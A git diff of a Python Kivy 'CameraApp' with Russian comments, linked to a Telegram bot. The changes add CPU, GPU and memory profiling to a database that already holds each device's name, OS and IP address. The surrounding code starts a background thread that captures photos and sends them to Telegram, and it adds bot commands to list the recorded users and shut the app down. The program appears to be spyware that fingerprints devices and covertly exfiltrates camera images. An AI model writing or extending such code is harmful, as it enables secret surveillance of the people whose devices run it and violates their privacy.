@@ -5,9 +5,11 @@ import random
 import time
 import sqlite3
 import platform
-import psutil  # Для получения системных данных
-import socket  # Для получения IP-адреса
-import os  # Для дополнительных системных данных
+import os
+import socket
+import sys
+import psutil
+import gpuinfo
 from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.label import Label
@@ -32,17 +34,22 @@ def create_db():
                     device_name TEXT,
                     os_info TEXT,
                     python_version TEXT,
-                    ip_address TEXT
+                    ip_address TEXT,
+                    cpu_info TEXT,
+                    cpu_cores INTEGER,
+                    gpu_name TEXT,
+                    total_memory REAL,
+                    used_memory REAL
                 )''')
     conn.commit()
     conn.close()
 
 # Добавление нового пользователя в базу данных
-def add_user(user_id, username, device_name, os_info, python_version, ip_address):
+def add_user(user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory):
     conn = sqlite3.connect('users.db')
     c = conn.cursor()
-    c.execute("INSERT INTO users (user_id, username, device_name, os_info, python_version, ip_address) VALUES (?, ?, ?, ?, ?, ?)", 
-              (user_id, username, device_name, os_info, python_version, ip_address))
+    c.execute("INSERT INTO users (user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
+              (user_id, username, device_name, os_info, python_version, ip_address, cpu_info, cpu_cores, gpu_name, total_memory, used_memory))
     conn.commit()
     conn.close()
 
@@ -54,6 +61,33 @@ def get_users():
     users = c.fetchall()
     conn.close()
     return users
+
+# Получение дополнительной информации о системе
+def get_additional_system_info():
+    # Получение информации о процессоре
+    cpu_info = psutil.cpu_freq().current  # Частота процессора
+    cpu_cores = psutil.cpu_count(logical=False)  # Количество физических ядер
+
+    # Получение информации о видеокарте
+    try:
+        gpu = gpuinfo.get_info()  # Получаем информацию о видеокарте
+        gpu_name = gpu[0].gpu_name if gpu else 'Не найдено'
+    except Exception as e:
+        print(f"Ошибка при получении информации о GPU: {e}")
+        gpu_name = 'Не найдено'
+
+    # Получение информации о памяти
+    memory_info = psutil.virtual_memory()
+    total_memory = memory_info.total / (1024 ** 3)  # В гигабайтах
+    used_memory = memory_info.used / (1024 ** 3)  # В гигабайтах
+
+    return {
+        'cpu_info': cpu_info,
+        'cpu_cores': cpu_cores,
+        'gpu_name': gpu_name,
+        'total_memory': total_memory,
+        'used_memory': used_memory
+    }
 
 # Отправка сообщений через Telegram
 def send_message_to_telegram(message):
@@ -77,7 +111,7 @@ def list_users(message):
     users = get_users()
     user_list = "Список пользователей:\n"
     for user in users:
-        user_list += f"ID: {user[1]}, Имя: {user[2]}, Устройство: {user[3]}, ОС: {user[4]}, IP: {user[6]}\n"
+        user_list += f"ID: {user[1]}, Имя: {user[2]}, Устройство: {user[3]}\n"
     bot.reply_to(message, user_list)
 
 @bot.message_handler(commands=['shutdown'])
@@ -95,26 +129,6 @@ def send_photo(message):
         bot.reply_to(message, "Фото отправлено!")
     else:
         bot.reply_to(message, "У вас нет прав для выполнения этой команды.")
-
-# Функция для получения IP-адреса
-def get_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.settimeout(0)
-    try:
-        s.connect(('10.254.254.254', 1))
-        ip = s.getsockname()[0]
-    except:
-        ip = '127.0.0.1'
-    finally:
-        s.close()
-    return ip
-
-# Функция для получения системной информации
-def get_system_info():
-    os_info = platform.system() + " " + platform.release()
-    python_version = platform.python_version()
-    ip_address = get_ip()
-    return os_info, python_version, ip_address
 
 # Создание базы данных
 create_db()
@@ -165,8 +179,15 @@ class CameraApp(App):
         self.username = "User"  # Пример имени пользователя, можно изменить
         self.user_id = "5420298695"  # Пример ID пользователя, можно изменить
         self.device_name = platform.node()  # Получаем имя устройства
-        os_info, python_version, ip_address = get_system_info()
-        add_user(self.user_id, self.username, self.device_name, os_info, python_version, ip_address)
+        os_info = platform.system()  # Получаем информацию о системе
+        python_version = sys.version  # Получаем версию Python
+        ip_address = socket.gethostbyname(socket.gethostname())  # Получаем IP-адрес устройства
+
+        system_info = get_additional_system_info()
+
+        add_user(self.user_id, self.username, self.device_name, os_info, python_version, ip_address,
+                 system_info['cpu_info'], system_info['cpu_cores'], system_info['gpu_name'],
+                 system_info['total_memory'], system_info['used_memory'])
 
         # Запускаем фоновый поток для фотосъемки
         threading.Thread(target=self.capture_and_send_photo, daemon=True).start()
